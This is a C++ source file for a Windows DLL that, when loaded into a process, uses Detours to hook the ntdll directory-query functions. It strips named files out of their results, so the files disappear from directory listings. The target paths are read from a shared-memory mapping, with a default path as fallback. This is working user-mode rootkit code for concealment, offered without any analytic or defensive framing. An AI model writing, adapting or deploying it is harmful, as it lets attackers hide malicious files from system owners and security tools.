#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>
#include "pch.h"
#include "detours.h"
#include <string>
#include <vector>
#include <Winternl.h>

using namespace std;

#define STATUS_NO_MORE_FILES 0x80000006
#define HIDE_PATH L"C:\\Users\\Public\\Documents\\example.txt"

#pragma pack(push)
#pragma pack(1)   // remove implicit padding so we can place it explicitly
#pragma pack(pop) // immediately restore; structs below use the compiler default

typedef struct _MY_FILE_DIRECTORY_INFORMATION {
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    WCHAR         FileName[1];
} MY_FILE_DIRECTORY_INFORMATION;

typedef struct _MY_FILE_FULL_DIR_INFORMATION {
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    WCHAR         FileName[1];
} MY_FILE_FULL_DIR_INFORMATION;

typedef struct _MY_FILE_BOTH_DIR_INFORMATION {
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    CCHAR         ShortNameLength;
    WCHAR         ShortName[12];
    WCHAR         FileName[1];
} MY_FILE_BOTH_DIR_INFORMATION;

typedef struct _MY_FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} MY_FILE_NAMES_INFORMATION;

typedef struct _MY_FILE_ID_BOTH_DIR_INFORMATION {
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    CCHAR         ShortNameLength;
    WCHAR         ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR         FileName[1];
} MY_FILE_ID_BOTH_DIR_INFORMATION;

typedef struct _MY_FILE_ID_FULL_DIR_INFORMATION {
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    LARGE_INTEGER FileId;
    WCHAR         FileName[1];
} MY_FILE_ID_FULL_DIR_INFORMATION;

typedef NTSTATUS(NTAPI* NtQueryDirectoryFile_t)(
    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation, ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);

typedef NTSTATUS(NTAPI* NtQueryDirectoryFileEx_t)(
    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation, ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags, PUNICODE_STRING FileName);

NtQueryDirectoryFile_t   origNtQueryDirectoryFile = NULL;
NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx = NULL;

struct HiddenEntry {
    std::wstring parentDir;
    std::wstring fileName;
};

struct EntryLayout {
    ULONG namelenOff;
    ULONG nameOff;
};

static std::vector<HiddenEntry> g_hiddenEntries;
static CRITICAL_SECTION         g_entriesLock;
static BOOL                     g_lockInitialized = FALSE;

static BOOL GetEntryLayout(FILE_INFORMATION_CLASS cls, EntryLayout* out) {
    switch ((ULONG)cls) {
    case 1:  // FileDirectoryInformation
        out->namelenOff = offsetof(MY_FILE_DIRECTORY_INFORMATION, FileNameLength);
        out->nameOff = offsetof(MY_FILE_DIRECTORY_INFORMATION, FileName);
        return TRUE;
    case 2:  // FileFullDirectoryInformation
        out->namelenOff = offsetof(MY_FILE_FULL_DIR_INFORMATION, FileNameLength);
        out->nameOff = offsetof(MY_FILE_FULL_DIR_INFORMATION, FileName);
        return TRUE;
    case 3:  // FileBothDirectoryInformation
        out->namelenOff = offsetof(MY_FILE_BOTH_DIR_INFORMATION, FileNameLength);
        out->nameOff = offsetof(MY_FILE_BOTH_DIR_INFORMATION, FileName);
        return TRUE;
    case 12: // FileNamesInformation
        out->namelenOff = offsetof(MY_FILE_NAMES_INFORMATION, FileNameLength);
        out->nameOff = offsetof(MY_FILE_NAMES_INFORMATION, FileName);
        return TRUE;
    case 37: // FileIdBothDirectoryInformation
        out->namelenOff = offsetof(MY_FILE_ID_BOTH_DIR_INFORMATION, FileNameLength);
        out->nameOff = offsetof(MY_FILE_ID_BOTH_DIR_INFORMATION, FileName);
        return TRUE;
    case 38: // FileIdFullDirectoryInformation
        out->namelenOff = offsetof(MY_FILE_ID_FULL_DIR_INFORMATION, FileNameLength);
        out->nameOff = offsetof(MY_FILE_ID_FULL_DIR_INFORMATION, FileName);
        return TRUE;
    default:
        return FALSE;
    }
}

static std::wstring NormalizePath(const std::wstring& path) {
    if (path.size() >= 4 && path.substr(0, 4) == L"\\\\?\\")
        return path.substr(4);
    return path;
}

static HiddenEntry SplitPath(const std::wstring& fullPath) {
    HiddenEntry e;
    size_t pos = fullPath.rfind(L'\\');
    if (pos != std::wstring::npos) {
        e.parentDir = fullPath.substr(0, pos);
        e.fileName = fullPath.substr(pos + 1);
    }
    else {
        e.fileName = fullPath;
    }
    return e;
}

static void BuildEntries(const std::vector<std::wstring>& paths) {
    g_hiddenEntries.clear();
    for (const auto& p : paths)
        g_hiddenEntries.push_back(SplitPath(p));
}

std::vector<std::wstring> deserializeWStringVector(std::wstring fileName) {
    std::vector<std::wstring> result;
    HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
    if (!fileMapping || fileMapping == INVALID_HANDLE_VALUE) return result;
    LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!mappedView) { CloseHandle(fileMapping); return result; }
    std::wstring serializedData(static_cast<const wchar_t*>(mappedView));
    size_t pos = 0;
    std::wstring token;
    while ((pos = serializedData.find(L',')) != std::wstring::npos) {
        token = serializedData.substr(0, pos);
        result.push_back(token);
        serializedData.erase(0, pos + 1);
    }
    if (!serializedData.empty()) result.push_back(serializedData);
    UnmapViewOfFile(mappedView);
    CloseHandle(fileMapping);
    return result;
}

static std::wstring GetHandlePath(HANDLE h) {
    WCHAR buf[MAX_PATH + 1] = {};
    if (GetFinalPathNameByHandleW(h, buf, MAX_PATH, FILE_NAME_NORMALIZED))
        return NormalizePath(std::wstring(buf));
    return {};
}

static BOOL DirHasHidden(const std::wstring& dir, const std::vector<HiddenEntry>& entries) {
    for (const auto& e : entries)
        if (_wcsicmp(dir.c_str(), e.parentDir.c_str()) == 0) return TRUE;
    return FALSE;
}

// Walks the NtQueryDirectoryFile output buffer (linked list via NextEntryOffset)
// and unlinks any entry whose name matches a hidden file in the given directory.
//
// *pAllRemoved is set TRUE if every entry in the buffer was removed, signalling
// the caller to retry the original function for the next batch.
static void FilterBuffer(
    PVOID buf, ULONG* bufLen,
    FILE_INFORMATION_CLASS cls,
    const std::wstring& dir,
    const std::vector<HiddenEntry>& entries,
    BOOL* pAllRemoved)
{
    *pAllRemoved = FALSE;

    EntryLayout layout;
    if (!GetEntryLayout(cls, &layout)) return;

    PBYTE cur = (PBYTE)buf;
    PBYTE prev = nullptr;
    ULONG len = *bufLen;

    while (TRUE) {
        ULONG  nextOff = *(ULONG*)cur;
        ULONG  nameLen = *(ULONG*)(cur + layout.namelenOff);
        WCHAR* name = (WCHAR*)(cur + layout.nameOff);
        std::wstring entryName(name, nameLen / sizeof(WCHAR));

        BOOL hide = FALSE;
        for (const auto& e : entries) {
            if (_wcsicmp(dir.c_str(), e.parentDir.c_str()) == 0 &&
                _wcsicmp(entryName.c_str(), e.fileName.c_str()) == 0) {
                hide = TRUE; break;
            }
        }

        if (hide) {
            if (nextOff == 0 && prev == nullptr) {
                // Only entry in this batch — caller must retry
                ZeroMemory(buf, len);
                *bufLen = 0;
                *pAllRemoved = TRUE;
                return;
            }
            else if (nextOff == 0) {
                *(ULONG*)prev = 0;
                break;
            }
            else if (prev == nullptr) {
                PBYTE next = cur + nextOff;
                ULONG move = len - (ULONG)(next - (PBYTE)buf);
                memmove(cur, next, move);
                ZeroMemory((PBYTE)buf + len - nextOff, nextOff);
                len -= nextOff;
                continue;
            }
            else {
                *(ULONG*)prev += nextOff;
                cur = prev + *(ULONG*)prev;
                continue;
            }
        }

        if (nextOff == 0) break;
        prev = cur;
        cur += nextOff;
    }

    *bufLen = len;
}

// Pattern for both:
//   1. Call original
//   2. If success, filter the buffer
//   3. If every entry was removed (allRemoved), retry, the kernel maintains
//      enumeration position per handle, so the next call returns the batch
//      AFTER the removed entries without restarting the scan.
// ---------------------------------------------------------------------------
NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, LPVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, LPVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
    NTSTATUS status;
    BOOLEAN  restart = RestartScan;

    for (;;) {
        status = origNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, restart);
        restart = FALSE;

        if (!NT_SUCCESS(status)) break;

        std::wstring dirPath = GetHandlePath(FileHandle);
        if (dirPath.empty()) break;

        EnterCriticalSection(&g_entriesLock);
        std::vector<HiddenEntry> entries = g_hiddenEntries;
        LeaveCriticalSection(&g_entriesLock);

        if (!DirHasHidden(dirPath, entries)) break;

        ULONG dataLen = (ULONG)IoStatusBlock->Information;
        BOOL  allRemoved = FALSE;
        FilterBuffer(FileInformation, &dataLen, FileInformationClass, dirPath, entries, &allRemoved);

        if (!allRemoved) {
            IoStatusBlock->Information = dataLen;
            break;
        }
        // allRemoved: every entry in this batch was our target file.
        // Loop again, origNtQueryDirectoryFile will advance to the next batch.
    }

    return status;
}

NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
    NTSTATUS status;
    ULONG    flags = QueryFlags;

    for (;;) {
        status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, flags, FileName);
        flags &= ~0x1; // clear SL_RESTART_SCAN for retries

        if (!NT_SUCCESS(status)) break;

        std::wstring dirPath = GetHandlePath(FileHandle);
        if (dirPath.empty()) break;

        EnterCriticalSection(&g_entriesLock);
        std::vector<HiddenEntry> entries = g_hiddenEntries;
        LeaveCriticalSection(&g_entriesLock);

        if (!DirHasHidden(dirPath, entries)) break;

        ULONG dataLen = (ULONG)IoStatusBlock->Information;
        BOOL  allRemoved = FALSE;
        FilterBuffer(FileInformation, &dataLen, FileInformationClass, dirPath, entries, &allRemoved);

        if (!allRemoved) {
            IoStatusBlock->Information = dataLen;
            break;
        }
    }

    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        DisableThreadLibraryCalls(hModule);
        InitializeCriticalSection(&g_entriesLock);
        g_lockInitialized = TRUE;

        std::vector<std::wstring> paths = deserializeWStringVector(L"pathMapped");
        if (paths.empty()) paths.push_back(HIDE_PATH);
        BuildEntries(paths);

        origNtQueryDirectoryFile = (NtQueryDirectoryFile_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryDirectoryFile");
        origNtQueryDirectoryFileEx = (NtQueryDirectoryFileEx_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryDirectoryFileEx");

        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)origNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
        DetourAttach(&(PVOID&)origNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
        DetourTransactionCommit();
        break;
    }
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)origNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
        DetourDetach(&(PVOID&)origNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
        DetourTransactionCommit();
        if (g_lockInitialized) {
            DeleteCriticalSection(&g_entriesLock);
            g_lockInitialized = FALSE;
        }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}